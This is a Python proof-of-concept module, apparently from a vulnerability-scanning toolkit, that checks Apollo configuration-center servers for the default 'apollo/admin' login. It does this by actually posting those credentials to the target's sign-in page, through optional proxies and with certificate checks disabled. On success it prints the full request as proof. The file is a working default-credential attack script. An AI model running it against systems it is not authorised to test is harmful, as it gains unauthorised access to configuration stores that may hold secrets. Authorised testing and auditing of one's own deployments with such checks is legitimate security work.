'''
Function:
    apollo 弱口令漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return scheme, netloc

    def vuln(self, netloc, scheme):
        url = "{}://{}/signin".format(scheme, netloc)
        data = {
            "username": "apollo",
            "password": "admin",
            "login-submit": "%E7%99%BB%E5%BD%95"
        }
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if 'name="login-submit"' not in result.text and "{{'Common.AppName' | translate }}" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在弱口令漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                for param, value in data.items():
                    values = param + "=" + value
                    self.value_list.append(values)
                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        scheme = all[0]
        netloc = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False

